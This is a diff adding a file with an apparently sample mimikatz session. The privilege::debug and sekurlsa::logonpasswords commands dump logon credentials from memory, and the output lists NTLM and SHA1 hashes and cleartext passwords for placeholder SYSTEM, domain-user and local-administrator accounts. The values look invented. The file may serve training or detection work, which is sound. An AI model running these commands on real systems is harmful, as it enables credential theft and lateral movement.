@@ -1,0 +1,84 @@
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : SYSTEM
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 5/30/2025 8:55:01 PM
+SID               : S-1-5-18
+  msv :
+    [00000003] Primary
+    * Username : SYSTEM
+    * Domain   : NT AUTHORITY
+    * NTLM     : 31d6cfe0d16ae931b73c59d7e0c089c0
+    * SHA1     : da39a3ee5e6b4b0d3255bfef95601890afd80709
+  tspkg :
+  wdigest :
+  kerberos :
+  ssp :
+  credman :
+  cloudap :
+
+Authentication Id : 0 ; 84587 (00000000:00014a6b)
+Session           : Interactive from 1
+User Name         : UtilisateurStandard
+Domain            : MON_DOMAINE
+Logon Server      : DC01
+Logon Time        : 5/30/2025 8:56:15 PM
+SID               : S-1-5-21-1234567890-987654321-111222333-1001
+  msv :
+    [00000003] Primary
+    * Username : UtilisateurStandard
+    * Domain   : MON_DOMAINE
+    * NTLM     : abcdef1234567890abcdef1234567890
+    * SHA1     : 1234567890abcdef1234567890abcdef12345678
+  tspkg :
+    * Username : UtilisateurStandard
+    * Domain   : MON_DOMAINE
+    * Password : MonSuperMotdepasse1!
+  wdigest :
+    * Username : UtilisateurStandard
+    * Domain   : MON_DOMAINE
+    * Password : MonSuperMotdepasse1!
+  kerberos :
+    * Username : UtilisateurStandard
+    * Domain   : MON_DOMAINE
+    * Password : (null)
+  ssp :
+  credman :
+  cloudap :
+
+Authentication Id : 0 ; 84589 (00000000:00014a6d)
+Session           : RemoteInteractive from 1
+User Name         : AdministrateurLocal
+Domain            : NOM_DE_L_ORDINATEUR
+Logon Server      : (null)
+Logon Time        : 5/30/2025 8:57:02 PM
+SID               : S-1-5-21-987654321-1234567890-333222111-500
+  msv :
+    [00000003] Primary
+    * Username : AdministrateurLocal
+    * Domain   : NOM_DE_L_ORDINATEUR
+    * NTLM     : fedcba9876543210fedcba9876543210
+    * SHA1     : 876543210fedcba9876543210fedcba987654321
+  tspkg :
+    * Username : AdministrateurLocal
+    * Domain   : NOM_DE_L_ORDINATEUR
+    * Password : PassW0rdAdm!n
+  wdigest :
+    * Username : AdministrateurLocal
+    * Domain   : NOM_DE_L_ORDINATEUR
+    * Password : PassW0rdAdm!n
+  kerberos :
+    * Username : AdministrateurLocal
+    * Domain   : NOM_DE_L_ORDINATEUR
+    * Password : (null)
+  ssp :
+  credman :
+  cloudap :
+
+mimikatz # exit
